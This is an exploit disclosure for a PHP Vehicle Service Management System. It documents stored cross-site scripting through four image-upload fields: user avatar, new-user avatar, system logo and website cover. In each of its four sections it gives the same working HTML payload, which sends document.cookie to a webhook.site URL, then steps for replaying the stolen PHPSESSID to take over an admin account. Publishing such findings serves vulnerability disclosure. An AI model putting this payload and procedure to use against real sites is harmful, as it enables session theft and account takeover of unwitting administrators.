# Vehicle Service Management System - 'Multiple' Cookie Stealing Leads to Full Account Takeover
Vehicle Service Management System - 'Multiple' Cookie Stealing Leads to Full Account Takeover

### Exploit Title: Vehicle Service Management System - 'Multiple' Cookie Stealing Leads to Full Account Takeover
### Date: 29/12/2021
### Exploit Author: P.L.Sanu
### Exploit Author Website: https://www.plsanu.com
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/14972/vehicle-service-management-system-php-free-source-code.html
### Version: <= 1.0
### Tested on: Windows 10
### CVE : 
### Google Dork: N/A
### Reference: 
- https://www.plsanu.com/vehicle-service-management-system-multiple-cookie-stealing-leads-to-full-account-takeover/
- https://github.com/plsanu/Vehicle-Service-Management-System-Multiple-Cookie-Stealing-Leads-to-Full-Account-Takeover

## 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Code:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In My Account Section enter all the required details and browse the html file in Avatar.
7. Click on update button.
8. Open the avatar image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

## 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Code:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Create New User Section enter all the required details and browse the html file in Avatar.
7. Click on Save button.
8. Open the avatar image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

## 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Code:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Settings Section enter all the required details and browse the html file in System Logo.
7. Click on update button.
8. Open the System Logo image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

## 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Code:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Settings Section enter all the required details and browse the html file in Website Cover.
7. Click on update button.
8. Open the Website Cover image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.
